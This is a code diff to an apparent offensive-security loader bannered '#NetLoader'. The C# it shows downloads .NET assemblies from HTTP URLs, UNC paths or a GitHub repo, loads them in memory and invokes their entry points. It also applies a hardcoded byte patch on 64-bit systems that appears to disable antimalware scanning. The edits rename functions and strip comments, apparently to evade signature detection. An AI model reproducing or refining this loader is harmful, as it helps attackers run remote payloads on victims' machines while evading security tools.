@@ -44,13 +44,13 @@ public class TotallyNotNt
 ~Flangvik  #NetLoader
 ";
         Console.WriteLine(bannerArt);
-        MoveLifeAhead(System.Environment.Is64BitOperatingSystem);
+        MoveLifeAhead();
 
         while (true)
         {
             try
             {
-                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+               ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
 
                 List<string> binList = GetBins();
 
@@ -119,36 +119,35 @@ public class TotallyNotNt
         {
             if (!customUrl.StartsWith("http") && customUrl.StartsWith("\\\\"))
             {
-				var foo = Assembly.Load(File.ReadAllBytes(customUrl));
-				testMe(foo,arguments);
+				testMe(Assembly.Load(File.ReadAllBytes(customUrl)),arguments).Invoke(null, new object[] { new string[] {  arguments } } );
+			
                
             }
             
 			if(customUrl.StartsWith("http") && !customUrl.StartsWith("\\\\"))
             {
-              var foo = Assembly.Load(leaveMeAlone.DownloadData(customUrl));
-			  testMe(foo,arguments);
+              testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl)),arguments).Invoke(null, new object[] { new string[] {  arguments } } );
+			
             }
         }
         else
         {
-			var foo = Assembly.Load(leaveMeAlone.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true"));
-			testMe(foo,arguments);
+			testMe(Assembly.Load(leaveMeAlone.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true")),arguments).Invoke(null, new object[] { new string[] {  arguments } } );
         }
 
 
 		
     }
 	
-	public static void testMe(Assembly asm, string args){
-			//Ripped from https://stackoverflow.com/questions/28616405/trouble-with-assembly-entrypoint-invoke-c
-			//Will this cause signatures to be made elsewhere ? 
+	
+	public static MethodInfo testMe(Assembly asm, string args){
+		
 		// Get your point of entry.
-		MethodInfo entryPoint = asm.EntryPoint;
+		MethodInfo Ripped = asm.EntryPoint;
 
-		// Invoke point of entry with arguments.
-		entryPoint.Invoke(null, new object[] { new string[] {  args } } );
-
+		//Invoke point of entry with arguments.
+		//Ripped.
+		return Ripped;
 
 	}
 	
@@ -183,7 +182,7 @@ public class TotallyNotNt
 				
 				 uint someNumber = 0;
 				 
-            if (BigBoy)
+            if (System.Environment.Is64BitOperatingSystem)
             {
 				var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 				
